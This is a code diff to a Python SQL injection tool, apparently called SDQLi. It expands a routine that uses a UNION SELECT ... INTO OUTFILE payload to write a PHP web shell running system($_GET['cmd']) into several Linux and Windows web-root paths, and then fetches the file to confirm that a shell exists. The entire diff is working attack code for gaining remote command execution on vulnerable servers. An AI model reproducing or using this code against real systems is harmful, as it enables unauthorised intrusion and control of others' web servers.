@@ -369,24 +369,34 @@ class SDQLi:
         print(f"[*] Testing {Colors.YELLOW}INTO OUTFILE{Colors.END} shell creation...")
         original_val = current_params[param_name]
         
-        # MySQL INTO OUTFILE test
-        shell_path = "/var/www/html/sqli_test.php"
+        # Generic web root paths for Linux and Windows
+        shell_paths = [
+            "/var/www/html/sd-shell.php",
+            "shell.php",
+            "C:/xampp/htdocs/sd-shell.php",
+            "C:/inetpub/wwwroot/sd-shell.php"
+        ]
+        
         shell_content = "<?php system($_GET['cmd']); ?>"
         cols = [f"'{i}'" for i in range(1, col_count + 1)]
         cols[ref_idx-1] = f"'{shell_content}'"
         
-        payload = f"{original_val}' UNION SELECT {','.join(cols)} INTO OUTFILE '{shell_path}'-- "
-        current_params[param_name] = payload
-        try:
-            self.session.get(self.url, params=current_params, timeout=2) # Might 500 but still work
-            check_url = f"{self.url.rsplit('/', 1)[0]}/sqli_test.php"
-            r = self.session.get(check_url, timeout=2)
-            if r.status_code == 200:
-                with self.lock:
-                    self.results['os_shell'] = True
-                    self.results['shell_url'] = check_url
-                    print(f" {Colors.GREEN}[+]{Colors.END} OS Shell created: {Colors.CYAN}{check_url}{Colors.END}")
-        except: pass
+        for shell_path in shell_paths:
+            payload = f"{original_val}' UNION SELECT {','.join(cols)} INTO OUTFILE '{shell_path}'-- "
+            current_params[param_name] = payload
+            try:
+                self.session.get(self.url, params=current_params, timeout=2)
+                # Check for success
+                check_url = f"{self.url.rsplit('/', 1)[0]}/{shell_path.split('/')[-1]}"
+                r = self.session.get(check_url, timeout=2)
+                if r.status_code == 200 and 'system(' not in r.text:
+                    with self.lock:
+                        self.results['os_shell'] = True
+                        self.results['shell_url'] = check_url
+                        print(f" {Colors.GREEN}[+]{Colors.END} OS Shell created: {Colors.CYAN}{check_url}{Colors.END}")
+                    break
+            except: pass
+        
         current_params[param_name] = original_val
 
     def run(self):
